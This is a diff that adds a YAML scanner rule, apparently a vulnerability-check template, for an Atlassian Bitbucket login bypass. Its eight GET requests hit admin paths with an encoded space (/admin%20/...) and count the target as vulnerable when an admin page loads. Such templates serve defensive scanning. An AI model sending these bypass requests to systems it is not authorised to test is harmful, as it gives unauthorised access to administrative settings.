@@ -1,0 +1,43 @@
+name: Atlassian-Bitbucket-Loginbypass
+rules:
+  r0:
+    request:
+      method: GET
+      path: /admin%20/mail-server
+    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
+  r1:
+    request:
+      method: GET
+      path: /admin%20/db
+    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
+  r2:
+    request:
+      method: GET
+      path: /admin%20/db/edit
+    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
+  r3:
+    request:
+      method: GET
+      path: /admin%20/license
+    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
+  r4:
+    request:
+      method: GET
+      path: /admin%20/logging
+    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
+  r5:
+    request:
+      method: GET
+      path: /admin%20/server-settings
+    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
+  r6:
+    request:
+      method: GET
+      path: /admin%20/authentication
+    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
+  r7:
+    request:
+      method: GET
+      path: /admin%20/avatars
+    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
+expression: r0() || r1() || r2() || r3() || r4() || r5() || r6() || r7()
